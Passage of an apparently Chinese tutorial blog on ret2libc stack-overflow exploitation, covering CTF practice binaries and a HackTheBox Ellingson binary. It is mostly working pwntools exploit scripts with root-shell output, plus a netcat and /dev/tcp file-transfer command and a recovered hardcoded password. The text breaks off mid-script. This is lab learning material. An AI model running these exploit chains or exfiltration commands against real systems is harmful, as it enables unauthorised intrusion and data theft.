0x0804A080\n\nsh = process(<span class=\"hljs-string\">'./ret2libc2'</span>)\nsh.sendline(112 * b<span class=\"hljs-string\">'A'</span> + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b<span class=\"hljs-string\">'A'</span> + p32(buf2))\nsh.sendline(<span class=\"hljs-string\">'/bin/sh'</span>)\nsh.interactive()\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc python exp.py   \n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2libc2'</span>: pid 4087\n/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  sh.sendline(<span class=\"hljs-string\">'/bin/sh'</span>)\n[*] Switching to interactive mode\nSomething surprise here, but I don<span class=\"hljs-string\">'t think it will work.\nWhat do you think ?$ id\nuid=0(root) gid=0(root) 组=0(root)\n</span></code></pre>\n<h3>ret2libc3</h3>\n<p>依旧是<code>gets</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image17.png\" alt=\"image.png\"></p>\n<p>保护机制和文件类型</p>\n<pre><code class=\"hljs language-bash\">➜  ret2libc checksec ret2libc3\n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n➜  ret2libc file ret2libc3\nret2libc3: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class=\"hljs-keyword\">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped\n</code></pre>\n<p>存在<code>gets</code>，可以用来构造<code>/bin/sh</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image18.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image19.png\" alt=\"image.png\"></p>\n<p>但是<code>system</code>函数也没了，所以我们要寻找<code>system</code>函数</p>\n<p>找到<code>system()</code>函数和<code>/bin/sh</code>字符串在<code>libc</code>中的地址</p>\n<ul>\n<li>首先获得一个函数的真实地址，例如：<code>__libc_start_main</code>，<code>puts</code></li>\n<li>得到真实地址后，根据最后三位即可得到 libc 版本</li>\n<li>得到 libc 版本后就可以很容易确定获得的真实函数的偏移地址（这里假设<code>puts</code>）</li>\n<li>计算基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址</li>\n<li>得到 libc 版本后获取 system 地址与 /bin/sh 的偏移地址</li>\n<li>根据 真实地址 = 基地址 + 偏移地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行 <code>system(‘/bin/sh’)</code></li>\n</ul>\n<p>编写脚本泄露<code>libc_start_main</code>的真实地址</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\ne = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)\nsh = process(<span class=\"hljs-string\">'./ret2libc3'</span>)\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nlibc_start_main_got_addr = e.got[<span class=\"hljs-string\">'__libc_start_main'</span>]\nmain_addr = e.symbols[<span class=\"hljs-string\">'main'</span>]\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'泄露 libc_start_main_got_addr 并返回到 main'</span>)\npayload1 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b<span class=\"hljs-string\">'Can you find it !?'</span>,payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\"</span>)\n</code></pre>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image20.png\" alt=\"image.png\"></p>\n<p>再下一步我们要得到 <code>libc</code>版本和基地址以及<code>system</code> 函数和<code>/bin/sh</code>字符串的地址</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nfrom LibcSearcher import *\ne = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)\nsh = process(<span class=\"hljs-string\">'./ret2libc3'</span>)\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nlibc_start_main_got_addr = e.got[<span class=\"hljs-string\">'__libc_start_main'</span>]\nmain_addr = e.symbols[<span class=\"hljs-string\">'main'</span>]\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'泄露 libc_start_main_got_addr 并返回到 main'</span>)\npayload1 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b<span class=\"hljs-string\">'Can you find it !?'</span>,payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\"</span>)\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'得到 libc 版本，并计算基地址和 system &#x26; /bin/sh 地址'</span>)\nlibc = LibcSearcher(<span class=\"hljs-string\">\"__libc_start_main\"</span>, libc_start_main_real_addr)\nlibcbase = libc_start_main_real_addr - libc.dump(<span class=\"hljs-string\">'__libc_start_main'</span>)\nsystem_addr = libcbase + libc.dump(<span class=\"hljs-string\">'system'</span>)\nbin_sh_addr = libcbase + libc.dump(<span class=\"hljs-string\">'/bin/sh'</span>)\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">'基地址:{libcbase},system地址:{system_addr},/bin/sh地址:{bin_sh_addr}'</span>)\n</code></pre>\n<p>这里吐槽一下<code>LibcSearcher</code> ，一直提示<code>[+] No libc satisfies constraints.</code> 貌似<code>fork</code>太久远了没更新</p>\n<p>这里直接链接本地的<code>libc</code>库了，不使用<code>LibcSearcher</code></p>\n<pre><code class=\"hljs language-bash\">from pwn import *\ne = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)\nlibc = ELF(<span class=\"hljs-string\">\"/lib32/libc.so.6\"</span>)\nsh = process(<span class=\"hljs-string\">'./ret2libc3'</span>)\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nlibc_start_main_got_addr = e.got[<span class=\"hljs-string\">'__libc_start_main'</span>]\nmain_addr = e.symbols[<span class=\"hljs-string\">'main'</span>]\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'泄露 libc_start_main_got_addr 并返回到 main'</span>)\npayload1 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b<span class=\"hljs-string\">'Can you find it !?'</span>,payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\"</span>)\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'计算基地址和 system &#x26; /bin/sh 地址'</span>)\nlibcbase = libc_start_main_real_addr - libc.sym[<span class=\"hljs-string\">'__libc_start_main'</span>]\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">'基地址:{hex(libcbase)},system地址:{hex(system_addr)},/bin/sh地址:{hex(bin_sh_addr)}'</span>)\n</code></pre>\n<p>所有参数我们都有了，就可以构造<code>payload</code>了</p>\n<ol>\n<li>\n<p>方案 <code>1</code>（这里仿照<code>wiki</code>上的写）：</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\ne = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)\np = process(<span class=\"hljs-string\">'./ret2libc3'</span>)\nlibc = ELF(<span class=\"hljs-string\">'/lib32/libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nlibc_start_main_addr = e.got[<span class=\"hljs-string\">'__libc_start_main'</span>]\nmain_addr = e.symbols[<span class=\"hljs-string\">'main'</span>]\npayload1 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\np.sendlineafter(<span class=\"hljs-string\">\"Can you find it !?\"</span>, payload1)\nlibc_start_main_real_addr = u32(p.recv()[0:4])\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\"</span>)\n\nlibcbase = libc_start_main_real_addr - libc.sym[<span class=\"hljs-string\">'__libc_start_main'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase = {hex(libcbase)}\"</span>)\nsystem_real_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_real_addr = {hex(system_real_addr)}\"</span>)\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\npayload2 = b<span class=\"hljs-string\">'A'</span> * 104+ p32(system_real_addr) + b<span class=\"hljs-string\">'A'</span> * 4 + p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>输出（失败了）：</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc python exp.py\n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2libc3'</span>: pid 4574\n[*] <span class=\"hljs-string\">'/lib32/libc.so.6'</span>\n    Arch:       i386-32-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, <span class=\"hljs-built_in\">timeout</span>=<span class=\"hljs-built_in\">timeout</span>)\nlibc_start_main_real_addr = 0x206f4e0a\nlibcbase = 0x206d010a\nsystem_real_addr = 0x2072232a\nbin_sh_addr = 0x20896f5c\n[*] Switching to interactive mode\n[*] Got EOF <span class=\"hljs-keyword\">while</span> reading <span class=\"hljs-keyword\">in</span> interactive\n$ <span class=\"hljs-built_in\">id</span>\n[*] Process <span class=\"hljs-string\">'./ret2libc3'</span> stopped with <span class=\"hljs-built_in\">exit</span> code -11 (SIGSEGV) (pid 4574)\n[*] Got EOF <span class=\"hljs-keyword\">while</span> sending <span class=\"hljs-keyword\">in</span> interactive\n</code></pre>\n</li>\n<li>\n<p>方案 2（大佬通过<code>puts</code>而不是<code>libc_start_main</code> ，并且二次返回到的更早之前）：</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\ne = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)\np = process(<span class=\"hljs-string\">'./ret2libc3'</span>)\nlibc = ELF(<span class=\"hljs-string\">'/lib32/libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nmain_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npayload1 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)\np.sendlineafter(<span class=\"hljs-string\">\"Can you find it !?\"</span>, payload1)\nputs_real_addr = u32(p.recv()[0:4])\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr = {hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase = {hex(libcbase)}\"</span>)\nsystem_real_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_real_addr = {hex(system_real_addr)}\"</span>)\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\npayload2 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(system_real_addr) + b<span class=\"hljs-string\">'A'</span> * 4 + p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>输出（成功）：</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc python exp.py\n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2libc3'</span>: pid 4630\n[*] <span class=\"hljs-string\">'/lib32/libc.so.6'</span>\n    Arch:       i386-32-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, <span class=\"hljs-built_in\">timeout</span>=<span class=\"hljs-built_in\">timeout</span>)\nputs_real_addr = 0xf7da72a0\nlibcbase = 0xf7d2b000\nsystem_real_addr = 0xf7d7d220\nbin_sh_addr = 0xf7ef1e52\n[*] Switching to interactive mode\n$ <span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) 组=0(root)\n</code></pre>\n</li>\n<li>\n<p>方案3，修复<code>wiki</code>上的方案</p>\n<p>不使用<code>__libc_start_main</code> 来获取第一个真实地址，而使用<code>puts</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc <span class=\"hljs-built_in\">cat</span> exp.py\nfrom pwn import *\ne = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)\np = process(<span class=\"hljs-string\">'./ret2libc3'</span>)\nlibc = ELF(<span class=\"hljs-string\">'/lib32/libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nlibc_start_main_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nmain_addr = e.symbols[<span class=\"hljs-string\">'main'</span>]\npayload1 = b<span class=\"hljs-string\">'A'</span> * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\np.sendlineafter(<span class=\"hljs-string\">\"Can you find it !?\"</span>, payload1)\nlibc_start_main_real_addr = u32(p.recv()[0:4])\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\"</span>)\n\nlibcbase = libc_start_main_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase = {hex(libcbase)}\"</span>)\nsystem_real_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_real_addr = {hex(system_real_addr)}\"</span>)\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\npayload2 = b<span class=\"hljs-string\">'A'</span> * 104+ p32(system_real_addr) + b<span class=\"hljs-string\">'A'</span> * 4 + p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>输出（成功）</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc python exp.py\n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2libc3'</span>: pid 6021\n[*] <span class=\"hljs-string\">'/lib32/libc.so.6'</span>\n    Arch:       i386-32-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, <span class=\"hljs-built_in\">timeout</span>=<span class=\"hljs-built_in\">timeout</span>)\nlibc_start_main_real_addr = 0xf7d902a0\nlibcbase = 0xf7d14000\nsystem_real_addr = 0xf7d66220\nbin_sh_addr = 0xf7edae52\n[*] Switching to interactive mode\n$ <span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) 组=0(root)\n</code></pre>\n<p>为什么第二次调用时使用<code>104</code>来填充栈而不是<code>112</code>？</p>\n<p>因为程序真正的入口是<code>_start</code>，而不是<code>main</code> ，我们来看<code>_start</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image21.png\" alt=\"image.png\"></p>\n<p>调用<code>main</code>前会先调用<code>and     esp, 0FFFFFFF0h</code> 来使堆栈平衡</p>\n<p>可以在 <code>_start</code> 处断点，然后<code>si</code>来一步一步调试查看 <code>esp</code> 的变化</p>\n<p>第一次我们运行<code>payload1</code>的时候是直接从<code>_start</code>开始运行的，会经过<code>and     esp, 0FFFFFFF0h</code> 使堆栈平衡，使栈 <code>+8</code> 得到<code>112</code> ，但是我们第二次执行<code>payload2</code>不是从<code>_start</code>开始，直接从<code>main</code>开始，<code>and</code>不执行，所以没有<code>+8</code> ，所以此时esp到覆盖返回地址为<code>112-8=104</code></p>\n<blockquote>\n<p><a href=\"https://xz.aliyun.com/news/14087\">https://xz.aliyun.com/news/14087</a></p>\n</blockquote>\n<p>也可以说第一次运行 <code>_start</code> + <code>main</code> 一共 <code>112</code> ，而第二次直接从<code>main</code>开始一共用了<code>104</code></p>\n</li>\n</ol>\n<h3>方案<code>1</code>失败的原因是</h3>\n<p>泄露的地址不正确（坏字符问题）</p>\n<p><code>libc_start_main_real_addr</code> 的值是 <code>0x206f4e0a</code>。<code>puts</code> 函数是用来打印字符串的，它遇到 <code>\\n</code> (<code>0x0a</code>) 就会停止读取并输出换行符，然后返回。看一下这个地址 <code>0x206f4e0a</code>，它的最后一个字节是 <code>0a</code>，也就是换行符 <code>\\n</code>。这就导致解包出来的 <code>libc_start_main_real_addr</code> 是一个完全错误的值 <code>0x206f4e0a</code></p>\n<h3>ret2libc - x64</h3>\n<p>来自 <code>HackTheBox - Ellingson</code></p>\n<p>运行它的时候，会让你输入密码</p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n</code></pre>\n<p>拉出去逆向看一眼</p>\n<pre><code class=\"hljs language-bash\">int __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  <span class=\"hljs-keyword\">if</span> ( !(unsigned int)auth(v4) )\n    <span class=\"hljs-built_in\">exit</span>(-1);\n  puts(<span class=\"hljs-string\">\"[+] W0rM || Control Application\"</span>);\n  puts(<span class=\"hljs-string\">\"[+] ---------------------------\"</span>);\n  puts(<span class=\"hljs-string\">\"Select Option\"</span>);\n  puts(<span class=\"hljs-string\">\"1: Check Balance\"</span>);\n  puts(<span class=\"hljs-string\">\"2: Launch\"</span>);\n  puts(<span class=\"hljs-string\">\"3: Cancel\"</span>);\n  puts(<span class=\"hljs-string\">\"4: Exit\"</span>);\n  <span class=\"hljs-keyword\">while</span> ( 1 )\n  {\n    <span class=\"hljs-keyword\">while</span> ( 1 )\n    {\n      <span class=\"hljs-keyword\">while</span> ( 1 )\n      {\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"> \"</span>);\n        __isoc99_scanf(<span class=\"hljs-string\">\"%d%*c\"</span>, &#x26;v3);\n        <span class=\"hljs-keyword\">if</span> ( v3 != 2 )\n          <span class=\"hljs-built_in\">break</span>;\n        launch();\n      }\n      <span class=\"hljs-keyword\">if</span> ( v3 > 2 )\n        <span class=\"hljs-built_in\">break</span>;\n      <span class=\"hljs-keyword\">if</span> ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    <span class=\"hljs-keyword\">if</span> ( v3 != 3 )\n    {\n      <span class=\"hljs-keyword\">if</span> ( v3 == 4 )\n        <span class=\"hljs-built_in\">exit</span>(0);\nLABEL_14:\n      puts(<span class=\"hljs-string\">\"Unknown option\"</span>);\n      <span class=\"hljs-built_in\">exit</span>(-1);\n    }\n    cancel();\n  }\n}\n</code></pre>\n<p>我们在开始运行的 <code>auth</code> 函数中发现了存在缓冲区溢出漏洞</p>\n<p>也就是让我们输入密码的地方，会有缓冲区溢出，<code>gets()</code> 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如<code>200</code>个字符），多出来的<code>100</code>个字符就会溢出，覆盖掉栈上 <code>s1</code> 相邻的其他数据。</p>\n<pre><code class=\"hljs language-bash\">__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Enter access password: \"</span>);\n  gets(s1);\n  putchar(10);\n  <span class=\"hljs-keyword\">if</span> ( !strcmp(s1, <span class=\"hljs-string\">\"N3veRF3@r1iSh3r3!\"</span>) )\n  {\n    strcpy(dest, <span class=\"hljs-string\">\"access granted for user: \"</span>);\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(<span class=\"hljs-string\">\"access granted.\"</span>);\n    <span class=\"hljs-built_in\">return</span> 1LL;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    puts(<span class=\"hljs-string\">\"access denied.\"</span>);\n    <span class=\"hljs-built_in\">return</span> 0LL;\n  }\n}\n</code></pre>\n<p><code>64</code>位程序</p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=\"hljs-keyword\">for</span> GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n</code></pre>\n<p>保护措施情况，开启了<code>NX</code></p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson checksec garbage \n[*] Checking <span class=\"hljs-keyword\">for</span> new versions of pwntools\n    To <span class=\"hljs-built_in\">disable</span> this functionality, <span class=\"hljs-built_in\">set</span> the contents of /root/.cache/.pwntools-cache-3.13/update to <span class=\"hljs-string\">'never'</span> (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n</code></pre>\n<p>检查一下是否开启了 <code>ALSR</code> ，开启了完全<code>ALSR</code></p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ <span class=\"hljs-built_in\">cat</span> /proc/sys/kernel/randomize_va_space\n2\n</code></pre>\n<p>这里要使用 <code>ret2libc</code> 攻击</p>\n<p>寻找一个真实的地址，首先我们查看<code>libc</code>文件</p>\n<pre><code class=\"hljs language-bash\">margo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n</code></pre>\n<p>将<code>/lib/x86_64-linux-gnu/libc.so.6</code>下载到靶机中</p>\n<pre><code class=\"hljs language-bash\">// kali\n➜  Ellingson nc -lvp 1234 > libc.so.6\n// Machine\nmargo@ellingson:~$ <span class=\"hljs-built_in\">cat</span> /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234\n</code></pre>\n<p>首先判断填充值，这里使用<code>garbage</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson pwndbg garbage \npwndbg> cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg> run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library <span class=\"hljs-string\">\"/lib/x86_64-linux-gnu/libthread_db.so.1\"</span>.\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n</code></pre>\n<p>程序果不其然崩溃了</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image22.png\" alt=\"image.png\"></p>\n<p>计算偏移值，这里使用<code>msf</code></p>\n<pre><code class=\"hljs language-bash\">➜  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n</code></pre>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image23.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">pwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n</code></pre>\n<p>得到偏移值<code>136</code> （PS：这里使用<code>pwndbg</code>的<code>cyclic</code>无法得到正确偏移值，但是<code>WP</code>中使用<code>gef</code>等都可以很容易就得到偏移值）</p>\n<p>得到偏移值后，我们选择一下获得哪个<code>plt</code>函数的真实地址</p>\n<pre><code class=\"hljs language-bash\">pwndbg> plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: <span class=\"hljs-built_in\">printf</span>@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: <span class=\"hljs-built_in\">read</span>@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: <span class=\"hljs-built_in\">exit</span>@plt\n</code></pre>\n<p><code>x64</code> 传参需要使用寄存器，<code>0x000000000040179b</code> 符合</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson ROPgadget --binary garbage --only <span class=\"hljs-string\">\"pop|ret\"</span>\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n</code></pre>\n<p>这里选择获得<code>puts@plt</code> ，我们通过<code>pwn</code>连接<code>ssh</code> 来调试</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span 